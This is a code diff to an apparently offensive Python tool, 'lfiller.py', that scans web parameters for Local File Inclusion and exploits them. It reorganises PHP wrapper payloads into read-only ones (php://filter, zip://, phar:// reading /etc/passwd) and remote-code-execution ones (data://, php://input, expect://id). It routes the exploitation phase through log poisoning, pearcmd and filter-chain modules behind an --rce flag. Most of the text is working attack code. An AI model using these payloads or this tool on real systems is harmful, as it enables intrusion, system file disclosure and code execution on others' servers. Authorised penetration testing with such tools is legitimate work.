@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """
-lfiller.py v3.6
-THE LFI AUDITOR: Industrial Grade Local File Inclusion Scanner..
+lfiller.py v3.6 Ultimate Industrial Edition
+THE LFI AUDITOR: Industrial Grade Local File Inclusion Scanner.
+Based on v3.0 Industrial.
 ADDED: 
 - Smart Payload Reuse (Auto-learns traversal depth)
 - RCE Safety Gating (--rce) & Advanced Shells (UDP/FD)
@@ -141,18 +142,21 @@ class LFILLER:
             'jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd'
         ]
         
-        self.php_wrappers = [
+        self.safe_wrappers = [
             ('php://filter/convert.base64-encode/resource=/etc/passwd', 'Base64 Filter'),
             ('php://filter/read=convert.base64-encode/resource=/etc/passwd', 'Base64 Read'),
             ('php://filter/string.rot13/resource=/etc/passwd', 'Rot13 Filter'),
             ('php://filter/convert.iconv.UTF-8.UTF-16/resource=/etc/passwd', 'Iconv Filter'),
+            ('php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd', 'Zlib Filter (WAF Bypass)'),
+            ('zip:///var/www/html/upload/malicious.jpg%23shell', 'Zip Wrapper (WSTG)'),
+            ('phar:///etc/passwd', 'Phar Wrapper')
+        ]
+        
+        self.rce_wrappers = [
             ('data://text/plain,<?php echo "TEST"; ?>', 'Data Wrapper'),
             ('data://text/plain;base64,PD9waHAgZWNobyAiVEVTVCI7ID8+', 'Data Base64'),
             ('php://input', 'PHP Input'),
-            ('expect://id', 'Expect Wrapper (RCE)'),
-            ('zip:///var/www/html/upload/malicious.jpg%23shell', 'Zip Wrapper (WSTG)'),
-            ('php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd', 'Zlib Filter (WAF Bypass)'),
-            ('phar:///etc/passwd', 'Phar Wrapper')
+            ('expect://id', 'Expect Wrapper (RCE)')
         ]
         
         self.interesting_files = [
@@ -271,10 +275,37 @@ class LFILLER:
                 except: continue
         return found_on_param
 
-    def test_wrappers(self, param):
-        """Test PHP wrappers on a vulnerable parameter"""
-        print(f"[*] Testing PHP wrappers on {Colors.CYAN}{param}{Colors.END}...")
-        for wrapper, name in self.php_wrappers:
+    def check_read_wrappers(self, param):
+        """Test Safe PHP wrappers (Read-Only)"""
+        print(f"[*] Testing Safe Wrappers on {Colors.CYAN}{param}{Colors.END}...")
+        for wrapper, name in self.safe_wrappers:
+            for encoded in self._apply_encoding(wrapper):
+                separator = '&' if '?' in self.url else '?'
+                test_url = f"{self.url}{separator}{param}={encoded}"
+                try:
+                    r = self.session.get(test_url, timeout=self.timeout)
+                    if r.status_code == 200:
+                        success = False
+                        if "php://filter" in wrapper:
+                            try:
+                                decoded = base64.b64decode(r.text).decode('utf-8', errors='ignore')
+                                if 'root:x:' in decoded or '<?php' in decoded: success = True
+                            except: pass
+                        elif "zip://" in wrapper or "phar://" in wrapper:
+                             # Difficult to verify without a specific file, but 200 OK + 'root:x:' is a good sign if we pointed to /etc/passwd
+                            if 'root:x:' in r.text: success = True
+
+                        if success:
+                            with self.lock:
+                                self.results['php_wrappers'].append((name, wrapper, test_url))
+                                print(f" {Colors.GREEN}[+]{Colors.END} Safe Wrapper works: {name}")
+                            break
+                except: continue
+
+    def check_exec_wrappers(self, param):
+        """Test RCE PHP wrappers (Unsafe) - Gated by --rce"""
+        print(f"[*] Testing Execution Wrappers on {Colors.CYAN}{param}{Colors.END}...")
+        for wrapper, name in self.rce_wrappers:
             for encoded in self._apply_encoding(wrapper):
                 separator = '&' if '?' in self.url else '?'
                 test_url = f"{self.url}{separator}{param}={encoded}"
@@ -286,12 +317,7 @@ class LFILLER:
                     
                     if r.status_code == 200:
                         success = False
-                        if "php://filter" in wrapper:
-                            try:
-                                decoded = base64.b64decode(r.text).decode('utf-8', errors='ignore')
-                                if 'root:x:' in decoded or '<?php' in decoded: success = True
-                            except: pass
-                        elif "data://" in wrapper or "php://input" in wrapper:
+                        if "data://" in wrapper or "php://input" in wrapper:
                             if 'WRAPPER_TEST' in r.text or 'TEST' in r.text: success = True
                         elif "expect://" in wrapper:
                             if 'uid=' in r.text or 'gid=' in r.text or r.text.strip() == "www-data":
@@ -300,7 +326,11 @@ class LFILLER:
                         if success:
                             with self.lock:
                                 self.results['php_wrappers'].append((name, wrapper, test_url))
-                                print(f" {Colors.GREEN}[+]{Colors.END} Wrapper works: {name}")
+                                print(f" {Colors.GREEN}[+]{Colors.END} RCE Wrapper works: {name}")
+                                
+                                # Set specific flags for exploitation phase
+                                if "data://" in wrapper: self.results['data_wrapper'] = True
+                                if "php://input" in wrapper: self.results['input_wrapper'] = True
                             break
                 except: continue
 
@@ -813,14 +843,13 @@ class LFILLER:
         vulnerable_params = list(set([r['param'] for r in self.results['lfi_params']]))
         for p in vulnerable_params[:1]: # Focus on the first working one for exploitation
             print(f"\n[*] Phase 2: Deep exploitation on {Colors.CYAN}{p}{Colors.END}")
-            self.test_wrappers(p)
-            self.test_wrappers(p)
+            self.check_read_wrappers(p)
             self.enumerate_files(p)
             
             # Gated RCE Modules (Poisoning, RFI, Wrappers, Filter Chain)
             if self.rce_mode:
-                self.check_filter_chain(p) # Moved inside RCE block as requested
-                self.check_input_wrappers(p)
+                self.check_exec_wrappers(p)
+                self.check_filter_chain(p) 
                 self.check_proc_environ(p)
                 self.check_pearcmd(p)
                 self.check_log_poisoning(p)
